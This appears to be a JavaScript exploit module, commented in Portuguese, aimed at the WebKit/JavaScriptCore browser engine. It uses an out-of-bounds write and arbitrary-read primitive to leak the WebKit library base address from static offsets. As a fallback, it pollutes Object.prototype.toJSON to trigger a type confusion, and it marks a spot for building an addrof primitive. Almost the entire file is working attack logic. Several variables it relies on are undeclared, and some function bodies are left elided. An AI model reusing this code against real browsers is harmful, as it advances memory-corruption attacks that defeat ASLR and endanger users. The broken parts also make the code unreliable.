// js/script3/testArrayBufferVictimCrash.mjs (R43L - Foco em ArbRead Estático + Fallback TC)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Incluir WEBKIT_LIBRARY_INFO

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_StaticReadFocus";

const VICTIM_TA_SCRATCHPAD_SIZE_ELEMENTS = 8;
const PROBE_CALL_LIMIT_V82 = 10;

// Parâmetros para TC (usados se a leitura estática falhar ou como verificação)
const OOB_OFFSET_FOR_TC_TRIGGER = 0x7C;
const OOB_VALUE_FOR_TC_TRIGGER = 0xABABABAB;

// Offsets para WebKitLeak padrão (se addrof de função for obtido)
const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let target_function_for_addrof_attempt; // Usado pela sonda TC
let leaked_address_via_addrof = null; // Endereço de target_function_for_addrof_attempt, se a sonda TC conseguir algo

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    // Adicionar verificação para ponteiros que podem estar fora da região de memória do WebKit (ex: kernel)
    // Ex: if (high >= 0xFFFFFF00) return false; // Muito simplista, depende do mapeamento de memória
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    try { return toHex(value); } catch (e) { return String(value); }
}

// Função para converter string de endereço (potencialmente com prefixo '0x') para AdvancedInt64
function addressStringToAdvInt64(addrString) {
    if (typeof addrString !== 'string') return null;
    const cleanedAddr = addrString.startsWith('0x') ? addrString.substring(2) : addrString;
    if (cleanedAddr.length > 16) return null; // Muito longo para 64-bit hex

    const paddedAddr = cleanedAddr.padStart(16, '0'); // Pad para 16 chars (64-bit)
    const highHex = paddedAddr.substring(0, 8);
    const lowHex = paddedAddr.substring(8, 16);

    const high = parseInt(highHex, 16);
    const low = parseInt(lowHex, 16);

    if (isNaN(high) || isNaN(low)) return null;
    return new AdvancedInt64(low, high);
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Foco em ArbRead Estático + Fallback TC ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init StaticRead...`;

    target_function_for_addrof_attempt = function someUniqueFnForTC() { /* ... */ };
    leaked_address_via_addrof = null;
    let final_probe_call_count_for_report = 0;
    let FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_StaticReadAttempt`; // Nome para esta fase

    logS3(`--- Fase 0 (StaticRead): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK || !arb_read) { // Verificar se arb_read existe
        logS3("Sanity check OOB ou arb_read indisponível. Abortando.", "critical");
        return { errorOccurred: "OOB Sanity Check Failed or arb_read missing", /*...*/ };
    }

    let result_overall = {
        errorOccurred: null, tc_probe_details: null, stringifyResultSonda: null,
        addrof_result: { success: false, msg: "Addrof (StaticRead): Não focado diretamente.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (StaticRead): Não obtido.", webkit_base_candidate: null },
        static_read_attempts: [], // Detalhes das tentativas de leitura estática
        tc_attempt_summary: null, // Sumário da tentativa de TC se a leitura estática falhar
        // Campos para compatibilidade com runner
        oob_params_of_best_result: null, 
        heisenbug_on_M2_confirmed_by_tc_probe: false, 
        total_probe_calls_last_iter: 0, 
        iteration_results_summary: [],
        final_title_page: ""
    };

    // --- TENTATIVA 1: Leitura de Endereços Estáticos ---
    logS3(`--- Fase 1 (StaticRead): Tentando ler de endereços estáticos conhecidos ---`, "subtest", FNAME_CURRENT_ITERATION);
    let static_read_success = false;
    if (JSC_OFFSETS.DATA_OFFSETS && Object.keys(JSC_OFFSETS.DATA_OFFSETS).length > 0) {
        for (const key in JSC_OFFSETS.DATA_OFFSETS) {
            const addrString = JSC_OFFSETS.DATA_OFFSETS[key];
            const static_addr = addressStringToAdvInt64(addrString);
            let attempt_detail = { name: key, address_str: addrString, read_value_str: null, is_valid_ptr: false, notes: "" };

            if (!static_addr) {
                attempt_detail.notes = "Endereço estático inválido no config.mjs.";
                logS3(`  [StaticRead] Endereço inválido para ${key}: ${addrString}`, "warn");
                result_overall.static_read_attempts.push(attempt_detail);
                continue;
            }

            logS3(`  [StaticRead] Tentando ler de ${key} @ ${static_addr.toString(true)} (Original: ${addrString})`, "info");
            try {
                const val64 = await arb_read(static_addr, 8);
                if (isAdvancedInt64Object(val64)) {
                    attempt_detail.read_value_str = val64.toString(true);
                    logS3(`    Lido de ${key}: ${val64.toString(true)}`, "leak");
                    if (isValidPointer(val64, `_static_${key}`)) {
                        attempt_detail.is_valid_ptr = true;
                        attempt_detail.notes = "Ponteiro válido encontrado!";
                        logS3(`      !!! PONTEIRO VÁLIDO LIDO DE ENDEREÇO ESTÁTICO ${key}: ${val64.toString(true)} !!!`, "success_major");
                        
                        // Calcular WebKit Base Candidate
                        const page_mask = new AdvancedInt64(0x0, ~0xFFF);
                        const base_candidate = val64.and(page_mask);
                        logS3(`        Potencial WebKit Base (de ${key}): ${base_candidate.toString(true)}`, "vuln");
                        
                        // Atualizar resultado global
                        result_overall.webkit_leak_result = { 
                            success: true, 
                            msg: `WebKitLeak via StaticRead de ${key}: ${base_candidate.toString(true)}`, 
                            webkit_base_candidate: base_candidate.toString(true),
                            source_static_addr_name: key,
                            source_static_addr_val: static_addr.toString(true),
                            leaked_internal_ptr: val64.toString(true)
                        };
                        static_read_success = true;
                        global_webkit_leak_found = true; // Para o título final
                        // Poderia parar aqui, mas vamos logar todos para análise completa
                    } else {
                        attempt_detail.notes = "Valor lido não é um ponteiro válido.";
                    }
                } else {
                    attempt_detail.read_value_str = String(val64);
                    attempt_detail.notes = "arb_read não retornou AdvancedInt64.";
                    logS3(`    Lido de ${key} (não AdvInt64): ${String(val64)}`, "warn");
                }
            } catch (e_ars) {
                attempt_detail.notes = `Erro ao ler de ${key}: ${e_ars.message}`;
                logS3(`    Erro ao ler de ${key}: ${e_ars.message}`, "error");
            }
            result_overall.static_read_attempts.push(attempt_detail);
            if (static_read_success) break; // Parar na primeira leitura estática bem-sucedida para WebKitLeak
        }
    } else {
        logS3("  [StaticRead] Nenhum DATA_OFFSETS encontrado em config.mjs para testar.", "warn");
    }

    if (static_read_success) {
        logS3(`--- WebKit Base Leak bem-sucedido via Leitura Estática! ---`, "success_major", FNAME_CURRENT_TEST_BASE);
    } else {
        logS3(`--- Leitura Estática falhou ou não produziu WebKit Base. Tentando fallback para TC... ---`, "warn", FNAME_CURRENT_TEST_BASE);
        // --- TENTATIVA 2: Fallback para TC e Ponto de Extensão para Addrof ---
        // (Esta parte é similar ao script "Base Melhorada Corrigido", mas simplificada para uma única tentativa de TC)
        FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_TCFallbackAttempt`;
        const tc_trigger_offset = OOB_OFFSET_FOR_TC_TRIGGER;
        const tc_trigger_value = OOB_VALUE_FOR_TC_TRIGGER;
        const tc_trigger_offset_hex = safeToHex(tc_trigger_offset);
        const tc_trigger_value_hex = safeToHex(tc_trigger_value);

        let victim_ta_scratchpad_for_getter = null;
        let m1_ref = null; 
        let m2_ref = null;
        let iter_addrof_details = { attempted: false, success: false, notes: "TC Fallback: Addrof não implementado no getter."};
        let tc_detected_this_iter = false;
        let tc_details_this_iter = null;
        let iter_primary_error_tc = null;
        let iter_stringify_output_raw_tc = null;

        function tc_fallback_probe_toJSON() {
            probe_call_count_iter++; /* ... (lógica da sonda TC como em "Base Melhorada", definindo getter) ... */
            const call_num = probe_call_count_iter;
            const ctts = Object.prototype.toString.call(this);
            const is_m2c = (this === m2_ref && m2_ref !== null);
            try {
                if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                if (call_num === 1 && this === victim_ta_scratchpad_for_getter) {
                    m2_ref = { id: "M2_TCFallback" };
                    m1_ref = { id: "M1_TCFallback", m2_payload: m2_ref };
                    return m1_ref;
                } else if (is_m2c) {
                    if (!tc_detected_this_iter) {
                        tc_detected_this_iter = true;
                        tc_details_this_iter = { /* ... */ this_is_M2: true, notes: "TC Confirmada (Fallback). Definindo getter em M2..."};
                        logS3(`[PROBE_TCFallback] Call #${call_num} (M2C): FIRST TC. 'this' é M2 (id: ${this.id}).`, "vuln");
                        try {
                            Object.defineProperty(this, 'leaky_prop_fallback', {
                                get: function() {
                                    logS3("   [GETTER_TCFallback] Getter em M2 ACIONADO!", "vuln_potential");
                                    iter_addrof_details.attempted = true;
                                    logS3("      [GETTER_TCFallback] PONTO DE EXTENSÃO: Implementar addrof aqui se StaticRead falhou.", "info_emphasis");
                                    iter_addrof_details.notes = "Addrof não implementado neste getter de fallback.";
                                    return "getter_fallback_placeholder";
                                }, enumerable: true, configurable: true
                            });
                        } catch (e_def_getter) { /* ... */ }
                    }
                    return this;
                }
            } catch (e_pm) { /* ... */ }
            return { gen_m: call_num, type: ctts };
        }

        try {
            victim_ta_scratchpad_for_getter = new Uint32Array(VICTIM_TA_SCRATCHPAD_SIZE_ELEMENTS);
            victim_ta_scratchpad_for_getter.fill(0);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
            oob_write_absolute(tc_trigger_offset, tc_trigger_value, 4);
            logS3(`   OOB Write (TC Fallback): ${tc_trigger_value_hex} @ ${tc_trigger_offset_hex}`, 'info');
            await PAUSE_S3(150);

            const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: tc_fallback_probe_toJSON, writable: true, configurable: true, enumerable: false });
                polluted = true;
                iter_stringify_output_raw_tc = JSON.stringify(victim_ta_scratchpad_for_getter);
                result_overall.stringifyResultSonda = iter_stringify_output_raw_tc;
                if (tc_detected_this_iter) logS3(`  TC Probe (Fallback): TC CONFIRMADA.`, "vuln");
                else logS3(`  TC Probe (Fallback): TC NÃO Confirmada.`, "warn");
            } catch (e_str) { iter_primary_error_tc = e_str; } finally { if (polluted) { /* ... */ } }
            
            result_overall.tc_attempt_summary = {
                oob_offset: tc_trigger_offset_hex, oob_value: tc_trigger_value_hex,
                error: iter_primary_error_tc ? (iter_primary_error_tc.message || String(iter_primary_error_tc)) : null,
                tc_probe_details: tc_details_this_iter,
                addrof_details_iter: iter_addrof_details,
                tc_confirmed: tc_detected_this_iter
            };
            result_overall.heisenbug_on_M2_confirmed_by_tc_probe = tc_detected_this_iter; // Atualizar o campo principal de TC
            if (tc_detected_this_iter) best_result_overall.oob_params_of_best_result = { offset: tc_trigger_offset_hex, value: tc_trigger_value_hex, raw_offset: tc_trigger_offset, raw_value: tc_trigger_value };

        } catch (e_outer_tc) { result_overall.errorOccurred = (result_overall.errorOccurred || "") + ` ErrTCFallback: ${e_outer_tc.message}`;}
        finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearTCFallback` }); }
        final_probe_call_count_for_report = probe_call_count_iter;
    } // Fim do else (fallback para TC)

    result_overall.total_probe_calls_last_iter = final_probe_call_count_for_report;
    // Simplificar iteration_results_summary para este script, pois o foco não é o loop massivo de TC
    result_overall.iteration_results_summary.push({ 
        notes: static_read_success ? "Leitura Estática de Endereço Teve Sucesso." : "Leitura Estática Falhou, TC Fallback executado.",
        static_read_results: result_overall.static_read_attempts,
        tc_fallback_summary: result_overall.tc_attempt_summary
    });
    // Para compatibilidade com runner, se o melhor resultado foi TC
    if (!static_read_success && result_overall.heisenbug_on_M2_confirmed_by_tc_probe && result_overall.oob_params_of_best_result) {
        result_overall.oob_value_of_best_result = `${result_overall.oob_params_of_best_result.offset}_${result_overall.oob_params_of_best_result.value}`;
    } else if (static_read_success) {
        result_overall.oob_value_of_best_result = "StaticReadSuccess";
    }


    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result_overall (StaticReadFocus): ${JSON.stringify(result_overall, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    let final_title = `${FNAME_CURRENT_TEST_BASE} Final: `;
    if(result_overall.webkit_leak_result.success) final_title += "WEBKITLEAK_VIA_STATIC_ADDR_OK! ";
    else if(result_overall.heisenbug_on_M2_confirmed_by_tc_probe) final_title += "StaticReadFail_TC_OK ";
    else if(result_overall.errorOccurred) final_title += `Error - ${result_overall.errorOccurred} `;
    if(final_title === `${FNAME_CURRENT_TEST_BASE} Final: `) final_title += "NoMajorSuccess";
    result_overall.final_title_page = final_title.trim();
    document.title = result_overall.final_title_page;

    return result_overall;
}
